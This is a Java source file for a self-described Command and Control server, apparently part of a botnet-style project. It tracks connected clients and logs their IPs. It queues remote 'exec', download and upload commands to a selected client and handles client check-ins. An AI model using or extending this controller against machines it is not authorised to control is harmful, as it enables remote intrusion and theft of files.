package server;

import java.io.IOException;
import java.util.HashMap;

import commands.*;
import tools.*;

/**
 * Represents a Command and Control (C&C) server
 * 
 * @author Yohan Chalier
 *
 */
public class CommandServer implements RequestHandler, CommandHandler {
	
	/**
	 *  The string returned when no matching command is found
	 */
	public static final String ERROR_COMMAND_NOT_FOUND = "Command not found.";
	
	/**
	 *  The set of commands for the server (CommandHandler)
	 */
	private final HashMap<String, CommandInterface> cmdsServer;
	
	/**
	 *  The set of commands for the client (RequestHandler)
	 */
	private final HashMap<String, CommandInterface> cmdsClient;
	
	/**
	 *  The set of connected clients IPs
	 */
	private ClientPool clients;
	
	/**
	 *  The currently selected client id.
	 *  When no client is selected, its value is -1.
	 */
	private int currentClient = -1;
	
	/**
	 * true if the previously selected client waits for an answer.
	 * Set to true when answering a ping request.
	 */
	private boolean clientConnected = false;
	
	/**
	 * To log incoming out outgoing requests.
	 */
	private Log log;
	
	private boolean closed = false;
	
	public CommandServer() {
		
		// Starting log
		log = new Log();
		
		// Creating clients sets
		try {
			clients = new ClientPool();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		// Adding commands
		cmdsServer = new HashMap<String, CommandInterface>();
		cmdsClient = new HashMap<String, CommandInterface>();
				
		cmdsServer.put("exit", new CommandInterface(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				closed = true;
				return null;
			}
			
		});
		
		cmdsServer.put("help", new HelpCmd(this));
		cmdsServer.put("list", new ListCmd(this));
		cmdsServer.put("select", new SelectCmd(this));
		cmdsServer.put("unselect", new UnselectCmd(this));
		cmdsServer.put("log", new LogCmd(this));
		cmdsServer.put("save_clients", new SaveClientsCmd(this));
		cmdsServer.put("info", new InfoCmd(this));
		
		cmdsServer.put("exec", new ToClientCommand(this, "EXEC"));
		cmdsServer.put("dwnld", new ToClientCommand(this, "DWNLD"));
		cmdsServer.put("upld", new ToClientCommand(this, "UPLD"));
		
		cmdsClient.put("DONE", new DoneCmd(this));
		cmdsClient.put("GETID", new GetIdCmd(this));
		cmdsClient.put("PING", new PingCmd(this));
		cmdsClient.put("OUT", new OutCmd(this));
		cmdsClient.put("UPLD", new UpldCmd(this));
		
	}

	public ClientPool getClients() {
		return clients;
	}

	public void setClients(ClientPool clients) {
		this.clients = clients;
	}

	public int getCurrentClient() {
		return currentClient;
	}

	public void setCurrentClient(int currentClient) {
		this.currentClient = currentClient;
	}

	public boolean isClientConnected() {
		return clientConnected;
	}

	public void setClientConnected(boolean clientConnected) {
		this.clientConnected = clientConnected;
	}

	public Log getLog() {
		return log;
	}

	public void setLog(Log log) {
		this.log = log;
	}

	public HashMap<String, CommandInterface> getCmdsServer() {
		return cmdsServer;
	}

	public HashMap<String, CommandInterface> getCmdsClient() {
		return cmdsClient;
	}
	
	public boolean isClosed() {
		return closed;
	}

	@Override
	public void handle(Connection conn)
			throws IOException {
				
		String response = null;
		while (response == null
				|| !response.startsWith(ServerCommand.DONE)) {
			
			ParsedCommand pCmd = conn.readRequest();
			
			// Logging request
			log.add(0, conn.getInetAddress() + "\t"
					+ pCmd.cmd + "\t" + pCmd.argLine());
			
			// Executing command
			if (cmdsClient.containsKey(pCmd.cmd)) {
				response = cmdsClient.get(pCmd.cmd).exec(pCmd);
				log.add(1, conn.getInetAddress() + "\t" + response);
				conn.write(response);
			}
			
			if (response != null
					&& response.startsWith(ServerCommand.N_DONE)) {
				ConnectedClient client = clients.get(currentClient);
				while (!client.hasCmd())
					try {
						Thread.sleep(50);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				response = client.popCmd();
				log.add(1, conn.getInetAddress() + "\t" + response);
				conn.write(response);
			}

		}
		
		clientConnected = false;
		
	}

	@Override
	public String executeCommand(String cmd) {
		ParsedCommand pCmd = new ParsedCommand(cmd);
		if (cmdsServer.containsKey(pCmd.cmd))
			return cmdsServer.get(pCmd.cmd).exec(pCmd);
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String getPrefix() {
		StringBuilder prefix = new StringBuilder();
		if (currentClient >= 0)
			prefix.append(currentClient);
		if (currentClient >= 0 && !clientConnected)
			prefix.append("*");
		return prefix.toString();
	}
	
}
